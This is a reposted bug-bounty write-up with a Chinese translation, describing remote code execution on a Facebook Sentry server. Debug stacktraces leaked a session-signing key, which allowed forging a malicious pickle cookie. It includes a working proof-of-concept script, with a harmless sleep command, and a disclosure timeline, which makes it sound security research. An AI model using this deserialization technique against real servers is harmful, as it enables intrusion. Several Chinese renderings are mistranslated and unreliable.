---
title: Review_Week2 - Remote Code Execution on a Facebook server
date: 2018-08-25 00:07:10
categories: Arts
tags:
 - Arts
 - Review
 - Week2

---
## [Remote Code Execution on a Facebook server][1]
By Blaklis

I regularly search for vulnerabilities on big services that allow it and have a Bug Bounty program. Here is my first paper which covers a vulnerability I discovered on one of Facebook’s servers.
我经常在大型服务器中需找漏洞，并且有个bug赏金计划。这个是我的第一篇文章，其中介绍了一个我在一台Facebook的服务器上发现的漏洞。

While scanning an IP range that belongs to Facebook (199.201.65.0/24), I found a Sentry service hosted on 199.201.65.36, with the hostname sentryagreements.thefacebook.com. Sentry is a log collection web application, written in Python with the Django framework.
当我在扫描属于Facebook（199.201.65.0/24）的IP范围时，我在199.201.65.36中找到了一个岗哨服务，主机名叫sentryagreements.thefacebook.com。岗哨是一个日子收集的网络程序，基于Django framework使用python开发的。

While I was looking at the application, some stacktraces regularly popped on the page, for an unknown reason. The application seemed to be unstable regarding the user password reset feature, which occasionally crashed. Django debug mode was not turned off, which consequently prints the whole environment when a stacktrace occurs. However, Django snips critical information (passwords, secrets, key…) in those stacktraces, therefore avoiding a massive information leakage.
正当我在看这个应用的时候，不知道什么原因，一些stacktraces不时的在页面上弹出。关于用户密码重置这个特性来看，这个应用看起来很不稳定，不时的崩溃。Django debug mode并没有关闭， 结果是当stacktrace发生时，日志打印出整个环境信息。无论如何，Django抓取了一些诸如密码和秘密，还有密钥等的关键的信息

However, by looking at the stacktrace a little more closely, some env keys were interesting :
无论如何，稍微仔细看了下stacktrace，一些环境的key值非常有意思：
```
The SESSION_COOKIE_NAME is sentrysid
SESSION_COOKIE_NAME是岗哨服务
The SESSION_SERIALIZER is django.contrib.sessions.serializers.PickleSerializer
SESSION_SERIALIZER是django.contrib.sessions.serializers.PickleSerializer
The SESSION_ENGINE is django.contrib.sessions.backends.signed_cookies
SESSION_ENGINE是django.contrib.sessions.backends.signed_cookies
The SENTRY_OPTIONS key that contains some Sentry configuration in a list.
SENTRY_OPTIONS键值包含了一些岗哨的在一个列表中的配置信息。
```
Pickle is a binary protocol for (un)serializing Python object structures, such as classes and methods in them. A comprehensive article that explains what Pickle is and its security implications is available here :
https://www.balda.ch/posts/2013/Jun/23/python-web-frameworks-pickle/
Pickle是一个用于python对象数据结构序列化和反序列化的协议，比如其中的类和方法。一篇关于Pickle和它的安全实现的文章地址如下：
https://www.balda.ch/posts/2013/Jun/23/python-web-frameworks-pickle/

If we were able to forge our own session that contains arbitrary pickle content, we could execute commands on the system. However, the SECRET_KEY that is used by Django for signing session cookies is not available in the stacktrace. However, the SENTRY_OPTIONS list contains a key named system.secret-key, that is not snipped. Quoting the Sentry documentation, system.secret-key is “a secret key used for session signing. If this becomes compromised it’s important to regenerate it as otherwise its much easier to hijack user sessions.“; wow, it looks like it’s a sort of Django SECRET-KEY override!
如果我们可以在我们的session里包含一些任意的pickle的内容，我们就可以执行系统的命令。无论如何，stacktrace里的被Django用于单独签名的session cookiesSECRET_KEY是无效的的。无论如何，SENTRY_OPTIONS的键值里包含system.secret-key，这是逃不掉的。引用Sentry的文档，system.secret-key是用于session 签名的一个的密钥。如果这一问题被破坏，那么重新生成它是很重要的，否则就更容易劫持用户会话。wow, 这看起来就像 Django 的某个SECRET-KEY被覆写了。

As we have everything to forge our own cookies with arbitrary pickle content, I wrote a little script that adds a payload into my own sentrysid cookie. Here it is :
我们想把一切东西都融合到我们包含arbitrary pickle的cookies里，我写了一个小脚本用于添加负载到我的sentrysid cookie里。如下所示：
```
#!/usr/bin/python
import django.core.signing, django.contrib.sessions.serializers
from django.http import HttpResponse
import cPickle
import os

SECRET_KEY='[RETRIEVEDKEY]'
#Initial cookie I had on sentry when trying to reset a password
cookie='gAJ9cQFYCgAAAHRlc3Rjb29raWVxAlgGAAAAd29ya2VkcQNzLg:1fjsBy:FdZ8oz3sQBnx2TPyncNt0LoyiAw'
newContent =  django.core.signing.loads(cookie,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies')
class PickleRce(object):
    def __reduce__(self):
        return (os.system,("sleep 30",))
newContent['testcookie'] = PickleRce()

print django.core.signing.dumps(newContent,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies',compress=True)
```
This code is a simple proof of concept; it takes the content of an existing sentrysid cookie, and replaces its content with an arbitrary object that will run a os.system(“sleep 30”) when unserialized.
这个代码是对概念的简单的证实。它获取了现存的sentrysid的cookie的内容，然后一个任意的对象替换了其中的内容，当反序列化的时候就会执行os.system(“sleep 30”)。

When using this cookie, the page actually takes an additional 30 seconds to load, which confirms the presence of the flaw.
当使用这个cookie的时候，页面就会自然等待30秒的去加载，以上证实了缺陷的存在。

Facebook acknowledged the vulnerability, took down the system until the flaw was patched, and then notified me about the patch being in place.
Facebook知道了这个漏洞，关闭了系统直到缺陷被打上补丁。然后通知我补丁已经就位。

Here is the disclosure timeline, which also demonstrates that Facebook security staff is reactive:
下面是批露的一些时间线，更证实了Facebook安全人员是被动的。
```
30.07.2018 00:00 CEST : initial disclosure with every details.
30.07.2018 00:00 CEST : 初始化泄漏所有的细节.
30.07.2018 15:25 CEST : triaged and system takedown.
30.07.2018 15:25 CEST : 系统修复和可拆卸.
09.08.2018 18:10 CEST : patch in place.
09.08.2018 18:10 CEST : 补丁就位.
09.08.2018 20:10 CEST : a 5000$ bounty is awarded – the server was in a separate VLAN with no users’ specific data.
09.08.2018 20:10 CEST : 一个5000美元的赏金被授予——服务器位于一个单独的VLAN中，没有用户的特定数据.
```
Thanks for reading!



[1]: https://blog.scrt.ch/2018/08/24/remote-code-execution-on-a-facebook-server/
